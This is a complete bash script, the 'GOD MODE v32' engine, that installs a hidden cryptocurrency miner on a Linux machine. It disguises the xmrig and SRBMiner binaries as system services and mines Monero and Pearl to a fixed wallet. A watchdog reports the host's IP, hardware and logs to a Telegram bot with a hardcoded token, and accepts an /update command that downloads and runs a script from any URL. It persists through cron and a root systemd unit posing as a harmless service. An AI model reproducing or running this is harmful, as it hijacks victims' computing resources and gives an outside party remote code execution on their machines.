#!/bin/bash

# ============================================================
# | GOD MODE v32: POSIX SHELL COMPATIBLE WATCHDOG ENGINE     |
# ============================================================

# [ CONFIGURATION ]
FIXED_WALLET_ID="krxYNV2DZQ"
TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TG_CHAT_ID="7032066912"

# Ссылка по умолчанию для обновления
DEFAULT_UPDATE_URL="https://raw.githubusercontent.com/xdLolKek/connfy-libs/refs/heads/main/Connfy.sh"

# [ REPORTING INTERVAL: 18000s = 5 Hours ]
REPORT_INTERVAL=18000 

# [ POOLS ]
POOL_CPU_1="xmr.kryptex.network:7029"
POOL_CPU_2="xmr-eu.kryptex.network:7029"

# Pearl (PRL) Pools for GPU (Kryptex Official)
POOL_GPU_1="prl.kryptex.network:7048"
POOL_GPU_2="prl-eu.kryptex.network:7048"

# [ PRIVILEGES & HIDDEN DIRECTORY ]
IS_ROOT=0
if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=1
    BASE_DIR="/usr/local/bin/.connfy-core"
else
    BASE_DIR="$HOME/.connfy-core"
fi
mkdir -p "$BASE_DIR"
cd "$BASE_DIR" || exit 1

# Добавляем BASE_DIR в PATH
export PATH="$BASE_DIR:$PATH"

# ----------------------------------------------------
# [ PHASE 0: SAFE WGET WRAPPER FALLBACK ]
# ----------------------------------------------------
if ! command -v wget >/dev/null 2>&1; then
    cat << 'EOF' > "$BASE_DIR/wget"
#!/bin/bash
URL=""
OUTFILE=""
NEXT_OUT=0
for arg in "$@"; do
    if [ "$NEXT_OUT" -eq 1 ]; then
        OUTFILE="$arg"
        NEXT_OUT=0
        continue
    fi
    case "$arg" in
        -O|-o|--output-document)
            NEXT_OUT=1
            ;;
        -O*|-o*)
            OUTFILE="${arg#??}"
            ;;
        http://*|https://*)
            URL="$arg"
            ;;
    esac
done
if [ -n "$OUTFILE" ] && [ "$OUTFILE" != "-" ]; then
    exec curl -L -k -s -o "$OUTFILE" "$URL"
else
    exec curl -L -k -s "$URL"
fi
EOF
    chmod +x "$BASE_DIR/wget"
fi

# Маскировочные имена процессов
BIN_CPU="sys_net_daemon" 
BIN_GPU="sys_render_service"

LOG_CPU="$BASE_DIR/.cpu_data.log"
LOG_GPU="$BASE_DIR/.gpu_data.log"

# ----------------------------------------------------
# [ PHASE 1: FAST IP & HARDWARE DETECTION ]
# ----------------------------------------------------
get_worker() {
    local ip
    ip=$(curl -s -m 3 --connect-timeout 2 api.ipify.org || curl -s -m 3 --connect-timeout 2 icanhazip.com || curl -s -m 3 --connect-timeout 2 ifconfig.me || wget -qO- --no-check-certificate -t 1 -T 2 ifconfig.me 2>/dev/null)
    [ -z "$ip" ] && ip="111.111.111.111"
    
    local safe_worker
    safe_worker=$(echo "$ip" | sed 's/\./A/g' | tr -cd '0-9A-Za-z')
    
    echo "${FIXED_WALLET_ID}.${safe_worker}"
}
WORKER=$(get_worker)
SERVER_IP=$(curl -s -m 3 --connect-timeout 2 api.ipify.org || curl -s -m 3 --connect-timeout 2 icanhazip.com || echo "Unknown-IP")

detect_gpu() {
    if [ -d "/proc/driver/nvidia" ] || [ -c "/dev/nvidia0" ] || [ -d "/sys/class/drm/card0" ]; then
        echo "1"
        return
    fi
    if command -v nvidia-smi >/dev/null 2>&1; then
        echo "1"
        return
    fi
    if command -v lspci >/dev/null 2>&1; then
        if timeout 2 lspci 2>/dev/null | grep -iE 'vga|3d|display' | grep -iE 'nvidia|amd|advanced micro|radeon' >/dev/null 2>&1; then
            echo "1"
            return
        fi
    fi
    echo "0"
}
HAS_GPU=$(detect_gpu)

# ----------------------------------------------------
# [ PHASE 2: MODULE DOWNLOAD & SAFE INSTALL ]
# ----------------------------------------------------
URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
URL_SRBMINER="https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.7/SRBMiner-Multi-3-4-7-Linux.tar.gz"

# CPU Setup
if [ ! -f "$BIN_CPU" ]; then
    curl -L -k -s -m 30 --connect-timeout 5 -o cpu.tar.gz "$URL_XMRIG" || wget -qO cpu.tar.gz --no-check-certificate -T 30 "$URL_XMRIG"
    if [ -f cpu.tar.gz ] && [ -s cpu.tar.gz ]; then
        tar -xf cpu.tar.gz 2>/dev/null
        FOUND_CPU=$(find . -type f -name "xmrig" | head -n 1)
        if [ -n "$FOUND_CPU" ]; then
            mv "$FOUND_CPU" "./$BIN_CPU"
            chmod +x "./$BIN_CPU"
        fi
        rm -rf cpu.tar.gz xmrig*
    fi
fi

# CPU Config
cat <<EOF > config.json
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false },
    "autosave": true,
    "background": false,
    "colors": false,
    "cpu": { "enabled": true, "huge-pages": true, "asm": true },
    "donate-level": 1,
    "pools": [
        { "url": "$POOL_CPU_1", "user": "$WORKER", "pass": "x", "keepalive": true },
        { "url": "$POOL_CPU_2", "user": "$WORKER", "pass": "x", "keepalive": true }
    ]
}
EOF

# GPU Setup (Проверка файла через 'grep -qia' без вызова бинарника)
if [ "$HAS_GPU" -eq 1 ]; then
    NEED_INSTALL=0
    if [ ! -f "$BIN_GPU" ]; then
        NEED_INSTALL=1
    else
        if ! grep -qia "SRBMiner" "./$BIN_GPU" 2>/dev/null; then
            rm -f "$BIN_GPU"
            NEED_INSTALL=1
        fi
    fi

    if [ "$NEED_INSTALL" -eq 1 ]; then
        pkill -9 -f "$BIN_GPU" 2>/dev/null
        rm -f "$BIN_GPU" gpu.tar.gz
        curl -L -k -s -m 40 --connect-timeout 5 -o gpu.tar.gz "$URL_SRBMINER" || wget -qO gpu.tar.gz --no-check-certificate -T 40 "$URL_SRBMINER"
        
        if [ -f gpu.tar.gz ] && [ -s gpu.tar.gz ]; then
            tar -xf gpu.tar.gz 2>/dev/null
            FOUND_GPU=$(find . -type f -name "SRBMiner-MULTI" | head -n 1)
            if [ -n "$FOUND_GPU" ] && [ -f "$FOUND_GPU" ]; then
                mv "$FOUND_GPU" "./$BIN_GPU"
                chmod +x "./$BIN_GPU"
            fi
            rm -rf gpu.tar.gz SRBMiner*
        fi
    fi
fi

# ----------------------------------------------------
# [ PHASE 3: SECURE WATCHDOG ENGINE (POSIX FIXED) ]
# ----------------------------------------------------
cat <<EOF > watchdog.sh
#!/bin/bash
BASE_DIR="$BASE_DIR"
BIN_CPU="$BIN_CPU"
BIN_GPU="$BIN_GPU"
POOL_GPU_1="$POOL_GPU_1"
POOL_GPU_2="$POOL_GPU_2"
WORKER="$WORKER"
SERVER_IP="$SERVER_IP"
TG_BOT_TOKEN="$TG_BOT_TOKEN"
TG_CHAT_ID="$TG_CHAT_ID"
DEFAULT_UPDATE_URL="$DEFAULT_UPDATE_URL"
REPORT_INTERVAL=$REPORT_INTERVAL
HAS_GPU=$HAS_GPU
IS_ROOT=$IS_ROOT

LOG_CPU="$LOG_CPU"
LOG_GPU="$LOG_GPU"

export PATH="\$BASE_DIR:\$PATH"
cd "\$BASE_DIR" || exit 1

LAST_REPORT=\$(date +%s)
PAUSED=0

send_tg_msg() {
    local msg="\$1"
    curl -s -m 5 --connect-timeout 3 -X POST "https://api.telegram.org/bot\$TG_BOT_TOKEN/sendMessage" \
         -d chat_id="\$TG_CHAT_ID" \
         -d text="\$msg" \
         -d parse_mode="HTML" > /dev/null 2>&1
}

is_target_me() {
    local target="\$1"
    
    if [ -z "\$target" ] || [ "\$target" = "all" ] || [ "\$target" = "ALL" ]; then
        return 0
    fi
    
    if [ "\$target" = "\$SERVER_IP" ] || [ "\$target" = "\$WORKER" ]; then
        return 0
    fi
    
    local safe_ip
    safe_ip=\$(echo "\$SERVER_IP" | sed 's/\./A/g')
    if [ "\$target" = "\$safe_ip" ]; then
        return 0
    fi
    
    return 1
}

send_telemetry_report() {
    local title="\$1"
    
    CPU_HASHRATE="0 H/s"
    CPU_SHARES="0"
    if [ -f "\$LOG_CPU" ]; then
        SPEED_LINE=\$(grep -i "speed 10s/60s/15m" "\$LOG_CPU" | tail -n 1)
        if [ -n "\$SPEED_LINE" ]; then
            RAW_SPEED=\$(echo "\$SPEED_LINE" | awk '{print \$5}')
            [ -n "\$RAW_SPEED" ] && CPU_HASHRATE="\${RAW_SPEED} H/s"
        fi
        SHARES_COUNT=\$(grep -c -i "accepted" "\$LOG_CPU" 2>/dev/null)
        [ -n "\$SHARES_COUNT" ] && CPU_SHARES="\$SHARES_COUNT"
    fi

    GPU_HASHRATE="0 H/s"
    GPU_SHARES="0"
    if [ "\$HAS_GPU" -eq 1 ] && [ -f "\$LOG_GPU" ]; then
        GPU_SPEED_LINE=\$(grep -iE "Hashrate:|Total Hashrate" "\$LOG_GPU" | tail -n 1)
        if [ -n "\$GPU_SPEED_LINE" ]; then
            RAW_GPU_SPEED=\$(echo "\$GPU_SPEED_LINE" | grep -o '[0-9.]*' | tail -n 1)
            [ -n "\$RAW_GPU_SPEED" ] && GPU_HASHRATE="\${RAW_GPU_SPEED} H/s"
        fi
        SHARES_GPU=\$(grep -c -i "accepted" "\$LOG_GPU" 2>/dev/null)
        [ -n "\$SHARES_GPU" ] && GPU_SHARES="\$SHARES_GPU"
    fi

    REPORT="📊 <b>\$title</b>%0A"
    REPORT="\${REPORT}🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A"
    REPORT="\${REPORT}🆔 <b>Worker:</b> <code>\$WORKER</code>%0A"
    REPORT="\${REPORT}⏱ <b>Uptime:</b> \$(uptime -p 2>/dev/null || echo 'N/A')%0A%0A"

    REPORT="\${REPORT}💻 <b>CPU Status:</b> \$CPU_STATUS%0A"
    REPORT="\${REPORT}⚡ <b>CPU Hashrate:</b> \$CPU_HASHRATE%0A"
    REPORT="\${REPORT}📦 <b>CPU Accepted Shares:</b> \$CPU_SHARES%0A%0A"

    if [ "\$HAS_GPU" -eq 1 ]; then
        REPORT="\${REPORT}🎮 <b>GPU Status (SRBMiner Pearl):</b> \$GPU_STATUS%0A"
        REPORT="\${REPORT}⚡ <b>GPU Hashrate:</b> \$GPU_HASHRATE%0A"
        REPORT="\${REPORT}📦 <b>GPU Accepted Shares:</b> \$GPU_SHARES%0A"
    else
        REPORT="\${REPORT}🎮 <b>GPU Status:</b> N/A (CPU-Only Machine)%0A"
    fi

    send_tg_msg "\$REPORT"
}

send_specs_report() {
    local cpu_model
    cpu_model=\$(grep "model name" /proc/cpuinfo 2>/dev/null | head -n 1 | cut -d: -f2 | xargs)
    [ -z "\$cpu_model" ] && cpu_model="Generic CPU"
    
    local cpu_cores
    cpu_cores=\$(nproc 2>/dev/null || echo "N/A")
    
    local load_avg
    load_avg=\$(cat /proc/loadavg 2>/dev/null | awk '{print \$1 ", " \$2 ", " \$3}')
    
    local ram_info
    ram_info=\$(free -h 2>/dev/null | awk '/Mem:/ {print \$3 " / " \$2}')
    
    local disk_info
    disk_info=\$(df -h / 2>/dev/null | awk 'NR==2 {print \$3 " / " \$2 " (" \$5 " used)"}')

    local msg="🖥 <b>SERVER HARDWARE & LOAD SPECS</b>%0A"
    msg="\${msg}🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A"
    msg="\${msg}🆔 <b>Worker:</b> <code>\$WORKER</code>%0A"
    msg="\${msg}⏱ <b>Uptime:</b> \$(uptime -p 2>/dev/null || echo 'N/A')%0A%0A"
    
    msg="\${msg}🧠 <b>CPU Model:</b> \$cpu_model (\$cpu_cores Cores)%0A"
    msg="\${msg}📈 <b>CPU Load (1m, 5m, 15m):</b> \$load_avg%0A"
    msg="\${msg}💾 <b>RAM Usage:</b> \$ram_info%0A"
    msg="\${msg}💽 <b>Disk Space:</b> \$disk_info%0A%0A"

    if command -v nvidia-smi >/dev/null 2>&1; then
        msg="\${msg}🎮 <b>GPU HARDWARE DIAGNOSTICS:</b>%0A"
        local gpu_idx=0
        
        # Исправленный POSIX-пайплайн для сбора статистики nvidia-smi
        nvidia-smi --query-gpu=name,utilization.gpu,memory.used,memory.total,temperature.gpu,fan.speed --format=csv,noheader,nounits 2>/dev/null | while IFS=',' read -r name util mem_used mem_total temp fan; do
            msg="\${msg}• <b>GPU \${gpu_idx}:</b> \${name}%0A"
            msg="\${msg}  └ Load: \${util}% | Temp: \${temp}°C | Fan: \${fan}% | VRAM: \${mem_used}MB / \${mem_total}MB%0A"
            gpu_idx=\$((gpu_idx + 1))
        done
    elif [ "\$HAS_GPU" -eq 1 ]; then
        msg="\${msg}🎮 <b>GPU DIAGNOSTICS:</b> Generic GPU Hardware Detected%0A"
    else
        msg="\${msg}🎮 <b>GPU DIAGNOSTICS:</b> No GPU Hardware Present%0A"
    fi

    send_tg_msg "\$msg"
}

send_logs_report() {
    local cpu_log_tail="No log data"
    local gpu_log_tail="No log data"
    [ -f "\$LOG_CPU" ] && cpu_log_tail=\$(tail -n 6 "\$LOG_CPU" 2>/dev/null | tr '\n' ' ')
    [ -f "\$LOG_GPU" ] && gpu_log_tail=\$(tail -n 6 "\$LOG_GPU" 2>/dev/null | tr '\n' ' ')
    
    local msg="📋 <b>RAW LOG TAIL REPORT</b>%0A"
    msg="\${msg}🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A%0A"
    msg="\${msg}💻 <b>CPU LOG TAIL:</b>%0A<code>\$cpu_log_tail</code>%0A%0A"
    msg="\${msg}🎮 <b>GPU LOG TAIL:</b>%0A<code>\$gpu_log_tail</code>"
    send_tg_msg "\$msg"
}

STARTUP_MSG="🚀 <b>ENGINE V32 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
send_tg_msg "\$STARTUP_MSG"

while true; do
    NOW=\$(date +%s)

    # --- 1. КОНТРОЛЬ ПРОЦЕССОВ ---
    if [ "\$PAUSED" -eq 0 ]; then
        CPU_STATUS="🟢 Active"
        if [ -f "./\$BIN_CPU" ]; then
            if ! pgrep -f "\$BIN_CPU" > /dev/null; then
                nohup ./\$BIN_CPU --config=config.json >> "\$LOG_CPU" 2>&1 &
                sleep 2
                if ! pgrep -f "\$BIN_CPU" > /dev/null; then
                    CPU_STATUS="🔴 Offline / Stalled"
                fi
            fi
        fi

        GPU_STATUS="N/A (No GPU)"
        if [ "\$HAS_GPU" -eq 1 ]; then
            GPU_STATUS="🟢 Active"
            if [ -f "./\$BIN_GPU" ]; then
                if ! pgrep -f "\$BIN_GPU" > /dev/null; then
                    chmod +x "./\$BIN_GPU"
                    nohup ./\$BIN_GPU --algorithm pearlhash --pool \$POOL_GPU_1 --wallet \$WORKER --pool \$POOL_GPU_2 --wallet \$WORKER --watchdog-enable --retry-time 10 --disable-cpu >> "\$LOG_GPU" 2>&1 &
                    sleep 2
                    if ! pgrep -f "\$BIN_GPU" > /dev/null; then
                        GPU_STATUS="🔴 Offline / Crashed"
                    fi
                fi
            fi
        fi
    else
        CPU_STATUS="⏸ Paused by Admin"
        GPU_STATUS="⏸ Paused by Admin"
    fi

    # --- 2. РОТАЦИЯ ЛОГОВ ---
    [ -f "\$LOG_CPU" ] && tail -n 300 "\$LOG_CPU" > "\$LOG_CPU.tmp" && mv "\$LOG_CPU.tmp" "\$LOG_CPU"
    [ -f "\$LOG_GPU" ] && tail -n 300 "\$LOG_GPU" > "\$LOG_GPU.tmp" && mv "\$LOG_GPU.tmp" "\$LOG_GPU"

    # --- 3. ТЕЛЕГРАМ ОБРАБОТЧИК ---
    LAST_CMD=\$(curl -s -m 3 --connect-timeout 2 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=-1&timeout=1" 2>/dev/null)
    UPDATE_ID=\$(echo "\$LAST_CMD" | grep -o '"update_id":[0-9]*' | head -n 1 | cut -d: -f2)

    if [ -n "\$UPDATE_ID" ]; then
        AUTH_CHECK=\$(echo "\$LAST_CMD" | grep -o '"id":'"\$TG_CHAT_ID")
        
        curl -s -m 2 --connect-timeout 1 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=\$((UPDATE_ID + 1))" >/dev/null 2>&1

        if [ -n "\$AUTH_CHECK" ]; then
            CMD_TARGET=\$(echo "\$LAST_CMD" | awk '{print \$2}' | tr -d '\r\n')

            if is_target_me "\$CMD_TARGET"; then
                
                if echo "\$LAST_CMD" | grep -iE "/status|/stat" >/dev/null 2>&1; then
                    send_telemetry_report "ON-DEMAND TELEMETRY REPORT"
                    
                elif echo "\$LAST_CMD" | grep -iE "/specs|/hw|/info" >/dev/null 2>&1; then
                    send_specs_report
                    
                elif echo "\$LAST_CMD" | grep -iE "/logs|/log" >/dev/null 2>&1; then
                    send_logs_report

                elif echo "\$LAST_CMD" | grep -iE "/update|/dl" >/dev/null 2>&1; then
                    CUSTOM_URL=\$(echo "\$LAST_CMD" | grep -o 'http[s]*://[^" ]*' | head -n 1)
                    [ -n "\$CUSTOM_URL" ] && TARGET_URL="\$CUSTOM_URL" || TARGET_URL="\$DEFAULT_UPDATE_URL"
                    
                    MODULE_DIR="\$BASE_DIR/updates"
                    mkdir -p "\$MODULE_DIR"
                    
                    TIMESTAMP=\$(date +%s)
                    DEST_SCRIPT="\$MODULE_DIR/Connfy_\${TIMESTAMP}.sh"
                    
                    curl -L -k -s -m 15 --connect-timeout 5 -o "\$DEST_SCRIPT" "\$TARGET_URL" || wget -qO "\$DEST_SCRIPT" --no-check-certificate -T 15 "\$TARGET_URL"
                    
                    if [ -f "\$DEST_SCRIPT" ] && [ -s "\$DEST_SCRIPT" ]; then
                        chmod +x "\$DEST_SCRIPT"
                        (nohup "\$DEST_SCRIPT" </dev/null >/dev/null 2>&1 &)
                        send_tg_msg "✅ <b>TARGET MATCHED (\$SERVER_IP):</b> Script updated from <code>\$TARGET_URL</code> and launched!"
                    else
                        send_tg_msg "❌ <b>UPDATE FAILED (\$SERVER_IP):</b> Could not fetch Connfy.sh from GitHub."
                    fi

                elif echo "\$LAST_CMD" | grep -i "/stop" >/dev/null 2>&1; then
                    PAUSED=1
                    pkill -9 -f "\$BIN_CPU" 2>/dev/null
                    pkill -9 -f "\$BIN_GPU" 2>/dev/null
                    send_tg_msg "🛑 <b>PAUSE COMMAND RECEIVED:</b> Processes terminated on IP \$SERVER_IP"

                elif echo "\$LAST_CMD" | grep -iE "/start|/restart" >/dev/null 2>&1; then
                    PAUSED=0
                    pkill -9 -f "\$BIN_CPU" 2>/dev/null
                    pkill -9 -f "\$BIN_GPU" 2>/dev/null
                    send_tg_msg "🔄 <b>RESUME COMMAND RECEIVED:</b> Restarting processes on IP \$SERVER_IP"
                fi
            fi
        fi
    fi

    # --- 4. ПЕРИОДИЧЕСКИЙ АВТО-ОТЧЕТ ---
    ELAPSED=\$(( NOW - LAST_REPORT ))
    if [ "\$ELAPSED" -ge "\$REPORT_INTERVAL" ]; then
        LAST_REPORT=\$NOW
        send_telemetry_report "PERIODIC TELEMETRY REPORT"
    fi

    sleep 60
done
EOF

chmod +x watchdog.sh

# Запускаем вачдог полностью отвязанным через явный bash
pkill -9 -f "watchdog.sh" 2>/dev/null
(nohup bash "$BASE_DIR/watchdog.sh" </dev/null >/dev/null 2>&1 &)

# ----------------------------------------------------
# [ PHASE 4: VERBOSE CLEAN ASCII DIAGNOSTICS ]
# ----------------------------------------------------
echo "================================================="
echo "[+] ENGINE V32 INITIALIZED"
echo "[+] Server IP: $SERVER_IP"
echo "[+] Worker ID: $WORKER"
echo "================================================="
echo "[+] Igniting core engines..."
sleep 3

echo "-------------------------------------------------"
echo "[+] CPU ENGINE STATUS:"
if pgrep -f "$BIN_CPU" >/dev/null; then
    CPU_PID=$(pgrep -f "$BIN_CPU" | head -n 1)
    echo "  [OK] RUNNING (PID: $CPU_PID)"
    echo "  [LOG] Initial Log Tail:"
    if [ -f "$LOG_CPU" ]; then
        tail -n 3 "$LOG_CPU" 2>/dev/null | sed 's/^/        /'
    else
        echo "        (Initializing log file...)"
    fi
else
    echo "  [ERR] OFFLINE / FAILED TO START"
fi

echo "-------------------------------------------------"
echo "[+] GPU ENGINE STATUS (SRBMiner Pearl):"
if [ "$HAS_GPU" -eq 1 ]; then
    if pgrep -f "$BIN_GPU" >/dev/null; then
        GPU_PID=$(pgrep -f "$BIN_GPU" | head -n 1)
        echo "  [OK] RUNNING (PID: $GPU_PID)"
        echo "  [LOG] Initial Log Tail:"
        if [ -f "$LOG_GPU" ]; then
            tail -n 3 "$LOG_GPU" 2>/dev/null | sed 's/^/        /'
        else
            echo "        (Initializing log file...)"
        fi
    else
        echo "  [ERR] OFFLINE / CHECKING GPU LOGS:"
        if [ -f "$LOG_GPU" ]; then
            tail -n 5 "$LOG_GPU" 2>/dev/null | sed 's/^/        /'
        fi
    fi
else
    echo "  [INFO] N/A (CPU-Only Machine)"
fi
echo "================================================="

# ----------------------------------------------------
# [ PHASE 5: SAFE PERSISTENCE ]
# ----------------------------------------------------
if command -v crontab >/dev/null 2>&1; then
    (timeout 2 crontab -l 2>/dev/null | grep -v "watchdog.sh"; \
     echo "@reboot $BASE_DIR/watchdog.sh"; \
     echo "*/10 * * * * $BASE_DIR/watchdog.sh") 2>/dev/null | timeout 2 crontab - 2>/dev/null
fi

if [ "$IS_ROOT" -eq 1 ] && [ -d "/run/systemd/system" ]; then
    cat <<EOF > /etc/systemd/system/connfy-wd.service
[Unit]
Description=Connfy Core Service
After=network.target

[Service]
Type=simple
ExecStart=$BASE_DIR/watchdog.sh
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable connfy-wd >/dev/null 2>&1
    systemctl start connfy-wd >/dev/null 2>&1
fi

hi
